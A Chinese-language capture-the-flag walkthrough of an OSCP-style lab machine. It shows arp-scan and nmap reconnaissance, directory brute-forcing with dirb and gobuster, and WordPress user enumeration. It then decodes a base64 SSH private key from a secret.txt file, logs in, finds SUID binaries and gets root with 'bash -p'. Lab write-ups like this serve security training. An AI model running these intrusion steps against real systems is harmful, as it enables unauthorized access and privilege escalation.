## **1、信息收集**

### **1.1通过arp-scan检测主机IP地址**

```
arp-scan 192.168.207.0/24
```

![](../Images/daed96432be326ea4c3367b20be8d7af.png)

### **1.2 通过nmap进行端口扫描**

```
nmap -A -sS -sV -v -p- 192.168.207.148
```

查看开放22、80、33060端口

![](../Images/048e29c61c5abb92465d13f5992c81af.png)

## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.站点信息收集**

访问站点首页显示OSCP靶机页面

![](../Images/000514089a936fd1dede14b880a1101a.png)

通过dirb进行目录扫描，发现存在WordPress

```
dirb http://192.168.207.148
```

![](../Images/38db9e7c7951e364f625e1581748addc.png)

#### **2.使用wpscan进行扫描**

使用wpscan未发现有用信息，仅发现一个admin账号

```
wpscan --url "http://192.168.207.148/" -eu
```

![](../Images/b1578d2135e6a4bae90da20d8737a06c.png)

使用gobuster进行爆破发现存在secret.txt

```
gobuster dir -u http://192.168.207.148 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
```

![](../Images/c756a08a7f346cbe636236c62143088d.png)

访问secret.txt中发现文件内容为base64编码

![](../Images/f5df6b05bc10da357315828c8ae00fe4.png)

#### **3.获取SSH密钥**

通过base64解码，发现为SSH密钥

![](../Images/2e72f0bda2a62c70057287bee261f8a0.png)

复制解密内容并保存为id\_rsa,修改文件权限，并根据站点首页提示仅有一个oscp账号

![](../Images/15c78cbec625a839241b385ddf79f501.png)

```

chmod 600 id\_rsa
```

![](../Images/08c75477619e7d8ff2600096e4af38aa.png)

### **2.2 主机渗透**

#### **1.查看SUID文件**

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/eab202dda40951ebc858747a83b53d0d.png)

#### **2.通过bash提权**

通过bash提权已经获取到root权限

```

bash -p
```

![](../Images/330632a0bba9680130fcd04b6714def3.png)

查看FLAG

```
cat /root/flag.txt
```
